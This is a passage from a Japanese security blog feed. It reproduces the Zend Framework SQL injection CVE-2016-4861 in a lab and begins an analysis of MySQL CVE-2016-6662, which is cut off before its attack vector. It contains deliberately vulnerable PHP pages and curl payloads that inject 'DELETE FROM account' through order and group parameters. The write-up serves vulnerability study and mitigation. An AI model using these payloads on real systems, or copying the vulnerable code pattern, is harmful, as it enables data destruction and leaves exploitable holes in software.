&lt;p&gt;Zned Framework 2系, 3系はこの脆弱性の影響を受けません。&lt;/p&gt;

&lt;h1 id=&quot;section-3&quot;&gt;技術的な詳細&lt;/h1&gt;

&lt;h2 id=&quot;zend-framework-11219&quot;&gt;Zend Framework 1.12.19の環境構築&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;Zend Framework 1.12.19のダウンロード&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kosuke@scapegoat ~ $ wget https://packages.zendframework.com/releases/ZendFramework-1.12.19/ZendFramework-1.12.19.tar.gz
kosuke@scapegoat ~ $ tar zxvf ZendFramework-1.12.19.tar.gz
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;php.iniを編集する&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@scapegoat:~# vim /etc/php5/apache2/php.ini
include_path = &quot;.:/home/kosuke/ZendFramework-1.12.19/library&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;テスト用スクリプト&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@scapegoat:~# cat /var/www/html/zend.php
&amp;lt;?php
require_once 'Zend/Version.php';
echo 'Hello, Zend Framework! Ver ' . Zend_Version::VERSION;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Apacheを再起動&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@scapegoat:~# service apache2 restart
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Zendが稼働することを確認&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@scapegoat:~# curl http://scapegoat.test/zend.php
Hello, Zend Framework! Ver 1.12.19
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h2 id=&quot;mysql&quot;&gt;テスト用のMySQLの環境を構築&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;MySQLユーザとデータベースの作成&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kosuke@scapegoat ~ $ mysql -uroot -pmust_rewrite
mysql&amp;gt; create database CVE_2016_4861;
mysql&amp;gt; GRANT ALL ON CVE_2016_4861.* TO 'zend'@'%' IDENTIFIED BY 'pass';
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;MySQLのテーブルを作成&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kosuke@scapegoat ~ $ mysql -uzend -ppass
mysql&amp;gt; use CVE_2016_4861;
Database changed
mysql&amp;gt; create table account (id int, name varchar(100), password varchar(100));
Query OK, 0 rows affected (0.01 sec)

mysql&amp;gt; desc account;
+----------+--------------+------+-----+---------+-------+
| Field    | Type         | Null | Key | Default | Extra |
+----------+--------------+------+-----+---------+-------+
| id       | int(11)      | YES  |     | NULL    |       |
| name     | varchar(100) | YES  |     | NULL    |       |
| password | varchar(100) | YES  |     | NULL    |       |
+----------+--------------+------+-----+---------+-------+
3 rows in set (0.00 sec)

mysql&amp;gt; insert into account (id, name, password) values(1, 'hoge', 'h0ge');
Query OK, 1 row affected (0.03 sec)

mysql&amp;gt; insert into account (id, name, password) values(2, 'foo', 'f00');
Query OK, 1 row affected (0.00 sec)

mysql&amp;gt; insert into account (id, name, password) values(3, 'bar', 'b@r');
Query OK, 1 row affected (0.00 sec)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h2 id=&quot;order-by&quot;&gt;order byの検証&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;order.php&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;require_once&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Zend/Db.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$mysql_info&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'host'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'127.0.0.1'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                    &lt;span class=&quot;s1&quot;&gt;'username'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'zend'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                    &lt;span class=&quot;s1&quot;&gt;'password'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'pass'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                    &lt;span class=&quot;s1&quot;&gt;'dbname'&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'CVE_2016_4861'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                    &lt;span class=&quot;s1&quot;&gt;'charset'&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'UTF8'&lt;/span&gt;
                    &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$order&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'order'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$db&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Zend_Db&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;factory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'PDO_MYSQL'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$mysql_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$select&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$db&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;select&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$select&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;from&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'account'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$select&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;order&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$order&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$stmt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$db&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$select&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$stmt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;fetchAll&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;var_dump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;脆弱性を利用してaccountテーブルのすべてのレコードを削除する&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kosuke@scapegoat ~ $ curl --data-urlencode &quot;order=MD5(\&quot;a(\&quot;);DELETE FROM account; #)&quot; http://scapegoat.test/order.php
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/images/2016/09/16/order.gif&quot; alt=&quot;order&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;group-by&quot;&gt;group byの検証&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;group.php&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;require_once&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Zend/Db.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$mysql_info&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'host'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'127.0.0.1'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                    &lt;span class=&quot;s1&quot;&gt;'username'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'zend'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                    &lt;span class=&quot;s1&quot;&gt;'password'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'pass'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                    &lt;span class=&quot;s1&quot;&gt;'dbname'&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'CVE_2016_4861'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                    &lt;span class=&quot;s1&quot;&gt;'charset'&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'UTF8'&lt;/span&gt;
                    &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$group&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'group'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$db&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Zend_Db&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;factory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'PDO_MYSQL'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$mysql_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$select&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$db&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;select&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$select&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;from&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'account'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$select&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;group&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$group&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$stmt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$db&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$select&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$stmt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;fetchAll&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;var_dump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;脆弱性を利用してaccountテーブルのすべてのレコードを削除する&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kosuke@scapegoat ~ $ curl --data-urlencode &quot;group=MD5(\&quot;a(\&quot;);DELETE FROM account; #)&quot; http://scapegoat.test/group.php
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/images/2016/09/16/group.gif&quot; alt=&quot;group&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;section-4&quot;&gt;追跡が必要な情報元&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.kb.cert.org/vuls/byid?query=CVE-2016-4861&amp;amp;searchview=&quot;&gt;CERT&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://security-tracker.debian.org/tracker/CVE-2016-4861&quot;&gt;Debian&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/search?q=&amp;quot;CVE-2016-4861&amp;quot;&quot;&gt;Github&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://lwn.net/Search/DoSearch?words=CVE-2016-4861&quot;&gt;LWN&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-4861&quot;&gt;NVD&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://packetstormsecurity.com/search/?q=CVE-2016-4861&quot;&gt;PacketStorm&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://access.redhat.com/security/cve/CVE-2016-4861&quot;&gt;Redhat&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://people.canonical.com/~ubuntu-security/cve/CVE-2016-4861.html&quot;&gt;Ubuntu&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://marc.info/?s=CVE-2016-4861&amp;amp;l=bugtraq&quot;&gt;bugtraq&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.exploit-db.com/search/?action=search&amp;amp;cve=2016-4861&quot;&gt;exploitdb&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://marc.info/?s=CVE-2016-4861&amp;amp;l=full-disclosure&quot;&gt;fulldisc&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.rapid7.com/db/search?q=CVE-2016-4861&quot;&gt;metasploit&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://marc.info/?s=CVE-2016-4861&amp;amp;l=oss-security&quot;&gt;oss-sec&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;section-5&quot;&gt;参考文献&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;https://framework.zend.com/security/advisory/ZF2016-03&lt;/li&gt;
  &lt;li&gt;http://jvndb.jvn.jp/ja/contents/2016/JVNDB-2016-000158.html&lt;/li&gt;
  &lt;li&gt;http://qiita.com/Kaki_Shoichi/items/d12b98d6ea56cfd1a6d4&lt;/li&gt;
  &lt;li&gt;https://framework.zend.com/manual/1.12/ja/zend.db.select.html&lt;/li&gt;
  &lt;li&gt;https://github.com/zendframework/zf1/blob/a90f3a8d71e0788020f730da83674b7312bd3b16/library/Zend/Db/Select.php#L89&lt;/li&gt;
&lt;/ul&gt;

</description>
        <pubDate>Fri, 16 Sep 2016 11:00:00 +0900</pubDate>
        <link>https://kosukeshimofuji.jp/2016/09/16/CVE-2016-4861/</link>
        <guid isPermaLink="true">https://kosukeshimofuji.jp/2016/09/16/CVE-2016-4861/</guid>
        
        
        <category>vulnerability</category>
        
      </item>
    
      <item>
        <title>CVE-2016-6662 - Remote Root Code Execution / Privilege Escalation (0day)</title>
        <description>&lt;h2 id=&quot;section&quot;&gt;概要&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;http://legalhackers.com/&quot;&gt;Dawid Golunski&lt;/a&gt;さんにより、MySQLの設定ファイルであるmy.cnfに悪意のある設定を注入できる脆弱性が発見されました。
この問題はデフォルト設定のすべてのMySQLサーバに影響します。
phpMyAdminやSQLinjectionなどのMySQLへのインターフェイスは攻撃を実行するためのプラットフォームとすることができます。
&lt;a href=&quot;http://legalhackers.com/advisories/MySQL-Exploit-Remote-Root-Code-Execution-Privesc-CVE-2016-6662.txt&quot;&gt;アドバイザリ&lt;/a&gt;では、攻撃者が任意のコードを実行し、その後root権限を奪取し完全にサーバを侵害することができることを示します。
SELinuxやAppArmorが導入されていてたとしてもデフォルトのアクティブなポリシーではこの攻撃を防ぐことはできません。&lt;/p&gt;

&lt;h2 id=&quot;cvss-v3&quot;&gt;CVSS v3&lt;/h2&gt;

&lt;p&gt;(2016/09/13時点でNVDでは未公開)&lt;/p&gt;

&lt;h2 id=&quot;section-1&quot;&gt;解決策、緩和策情報&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;攻撃を実行され得るmysqlのユーザのFILE権限を落とす
    &lt;ul&gt;
      &lt;li&gt;CVE-2016-6663が公表されればFILE権限を落としてもmysql権限でファイルを作成される可能性がある、しかし今回のような悪意のあるshareライブラリをuploadすることはできなくなるので、本脆弱性単体でのroot権限の奪取は出来ないはず&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;/etc/my.cnf、/etc/mysql/my.cnf、SYSCONFDIR/my.cnf, $MYSQL_HOME/my.cnfなどのMySQLに読み込まれ得るmy.cnfのパーミッションをmysqlユーザから書き込めないようにする&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;section-2&quot;&gt;影響を受けるソフトウェアとバージョン&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;MySQL&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;= 5.7.15
&amp;lt;= 5.6.33
&amp;lt;= 5.5.52
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;MariaDB&lt;/li&gt;
  &lt;li&gt;PeroconaDb&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;section-3&quot;&gt;技術的な詳細&lt;/h2&gt;

&lt;p&gt;デフォルトのMySQLのパッケージには多くの人に使用されているmysqld_safeスクリプトが付属しています。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@CVE-2016-6662:~# lsb_release -a
No LSB modules are available.
Distributor ID: Debian
Description:    Debian GNU/Linux 8.5 (jessie)
Release:        8.5
Codename:       jessie
root@CVE-2016-6662:~# dpkg -l | grep -i mysql-server
ii  mysql-server                   5.5.50-0+deb8u1             all          MySQL database server (metapackage depending on the latest version)
ii  mysql-server-5.5               5.5.50-0+deb8u1             amd64        MySQL database server binaries and system database setup
ii  mysql-server-core-5.5          5.5.50-0+deb8u1             amd64        MySQL database server binaries
root@CVE-2016-6662:~# service mysql start
root@CVE-2016-6662:~# ps aux | grep mysqld
root     17493  0.0  0.3   4336  1620 ?        S    14:10   0:00 /bin/sh /usr/bin/mysqld_safe
mysql    17840  0.0  9.4 558156 47800 ?        Sl   14:10   0:00 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --user=mysql --log-error=/var/log/mysql/error.log --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock --port=3306
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;上記の通りmysqld_safeプロセスはroot権限として実行されており、mysqldのプロセスはmysql権限で動いており、 mysqld_safeには以下の関数が含まれています。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;   313  # set_malloc_lib LIB
   314  # - If LIB is empty, do nothing and return
   315  # - If LIB is 'tcmalloc', look for tcmalloc shared library in /usr/lib
   316  #   then pkglibdir.  tcmalloc is part of the Google perftools project.
   317  # - If LIB is an absolute path, assume it is a malloc shared library
   318  #
   319  # Put LIB in mysqld_ld_preload, which will be added to LD_PRELOAD when
   320  # running mysqld.  See ld.so for details.
   321  set_malloc_lib() {
   322    malloc_lib=&quot;$1&quot;
   323
   324    if [ &quot;$malloc_lib&quot; = tcmalloc ]; then
   325      pkglibdir=`get_mysql_config --variable=pkglibdir`
   326      malloc_lib=
   327      # This list is kept intentionally simple.  Simply set --malloc-lib
   328      # to a full path if another location is desired.
   329      for libdir in /usr/lib &quot;$pkglibdir&quot; &quot;$pkglibdir/mysql&quot;; do
   330        for flavor in _minimal '' _and_profiler _debug; do
   331          tmp=&quot;$libdir/libtcmalloc$flavor.so&quot;
   332          #log_notice &quot;DEBUG: Checking for malloc lib '$tmp'&quot;
   333          [ -r &quot;$tmp&quot; ] || continue
   334          malloc_lib=&quot;$tmp&quot;
   335          break 2
   336        done
   337      done
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;このコードはmysqlサーバ起動時にsahredライブラリをpreloadするために使用することができます。このライブラリはmysqld_safeに以下のパラメータを渡すことにより設定することができます。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;--malloc-lib=LIB
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;このパラメータはmy.cnfの[mysqld]もしくは[mysqld_safe]セクションでも設定することができます。 攻撃者はroot権限で悪意のあるライブラリをpreloadさせるために、my.cnfに悪意のあるパスを指定します。この設定は手動での再起動、システムアップデート、パッケージのアップデート、システムのリブートなどにより反映されます。
2003年の公表されたMySQL3.23.55以前にversionに内在する脆弱性では以下のシンプルなステートメントで攻撃者はmysqlのコンフィグファイルを作成することができました。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SELECT * INFO OUTFILE '/var/lib/mysql/my.cnf'
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;この問題はOUTFILEで作成されるような誰でも書き込めるようなパーミッションを持つコンフィグファイルを読み込まないようにすることで対応されました。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;OUTFILEで作成されるファイルのパーミッション&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mysql&amp;gt; select 'CVE-2016-6662' INTO OUTFILE '/tmp/CVE-2016-6662';
Query OK, 1 row affected (0.00 sec)

root@CVE-2016-6662:~# ls -l /tmp/CVE-2016-6662
-rw-rw-rw- 1 mysql mysql 14  9月 13 15:52 /tmp/CVE-2016-6662
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;OUTFILEで作成される設定ファイルは読み込まれない&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@CVE-2016-6662:~# ls -l /etc/mysql/my.cnf
-rw-r--r-- 1 root root 3533  7月 21 14:04 /etc/mysql/my.cnf
root@CVE-2016-6662:~# chown mysql:mysql /etc/mysql/my.cnf
root@CVE-2016-6662:~# chmod 666 /etc/mysql/my.cnf
root@CVE-2016-6662:~# ls -l /etc/mysql/my.cnf
-rw-rw-rw- 1 mysql mysql 3533  7月 21 14:04 /etc/mysql/my.cnf
root@CVE-2016-6662:~# service mysql restart
root@CVE-2016-6662:~# tail -f  /var/lib/mysql/CVE-2016-6662.test.err | grep -i world
Warning: World-writable config file '/etc/mysql/my.cnf' is ignored
Warning: World-writable config file '/var/lib/mysql/my.cnf' is ignored
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;また追加のプロテクトとしてOUTFILE/DUMPFILEを使用して存在するファイルを上書きすることはできなくなりました。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@CVE-2016-6662:~# ls -l /etc/mysql/my.cnf
-rw------- 1 mysql mysql 3533  7月 21 14:04 /etc/mysql/my.cnf

mysql&amp;gt; select 'CVE-2016-6662' INTO OUTFILE '/etc/mysql/my.cnf';
ERROR 1086 (HY000): File '/etc/mysql/my.cnf' already exists
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;この古い脆弱性は2003年にMySQL3.23.55にて修正されたと信じられてきました。しかし以下に示すAttack Vectorの実行が可能です。&lt;/p&gt;

&lt;h2 id=&quot;mysqlmysql&quot;&gt;mysqlユーザによって書き込み可能な設定ファイルを保持している場合、既存のMySQLの設定ファイルに悪意のある設定を注入することができる。&lt;/h2&gt;

